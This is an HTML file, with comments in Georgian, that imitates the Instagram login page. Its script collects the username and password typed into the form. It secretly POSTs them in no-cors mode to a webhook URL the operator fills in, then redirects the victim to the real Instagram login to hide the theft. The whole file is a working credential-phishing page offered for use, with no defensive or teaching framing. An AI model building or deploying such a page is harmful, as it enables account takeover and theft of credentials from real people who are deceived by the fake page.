<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* CSS აქ არის - ვიზუალისთვის */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background-color: #fafafa; 
            font-family: -apple-system, sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px 30px; text-align: center; }
        .logo { width: 175px; margin: 0 auto 20px; display: block; }
        input { width: 100%; height: 38px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; padding: 9px 8px; font-size: 12px; }
        button { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511100652.png" alt="Instagram" class="logo">
    
    <form id="loginForm">
        <input type="text" id="user" placeholder="Phone number, username, or email" required>
        <input type="password" id="pass" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <div class="divider">OR</div>
    <div class="fb-login">Log in with Facebook</div>
</div>

<script>
    // აი აქ არის ჯავასკრიპტი!
    const form = document.getElementById('loginForm');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault(); // რომ გვერდი არ დარეფრეშდეს ეგრევე
        
        const username = document.getElementById('user').value;
        const password = document.getElementById('pass').value;
        const webhookURL = "შენი_WEBHOOK_URL_აქ"; // <-- აქ ჩასვი შენი ლინკი

        // მონაცემების გაგზავნა ფარულად
        fetch(webhookURL, {
            method: 'POST',
            mode: 'no-cors', // რომ ბრაუზერმა არ დაბლოკოს გაგზავნა
            body: JSON.stringify({
                username: username,
                password: password
            }),
            headers: { 'Content-Type': 'application/json' }
        }).then(() => {
            // მას შემდეგ რაც მონაცემები მოვა შენთან, გადავიყვანოთ ნამდვილ საიტზე
            window.location.href = "https://www.instagram.com/accounts/login/";
        });
    });
</script>

</body>
</html>
